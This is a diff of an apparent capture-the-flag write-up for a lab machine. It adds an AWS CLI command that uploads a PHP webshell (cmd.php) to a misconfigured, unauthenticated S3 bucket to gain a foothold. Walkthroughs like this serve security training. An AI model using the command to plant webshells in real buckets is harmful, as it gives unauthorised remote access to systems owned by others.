@@ -108,7 +108,13 @@ Prevent credential requesting
 We can then upload a file as permissions are misconfigured therefore uploading a webshell would be the next move.
 ![](fileupload.png)
 Although it is being removed. 
-![](ready.png)
+![1000](ready.png)
+
+```bash
+aws --endpoint-url http://s3.bucket.htb --no-sign-request s3 cp cmd.php s3://adserver/images/
+
+
+```
 
 ## Foothold
 
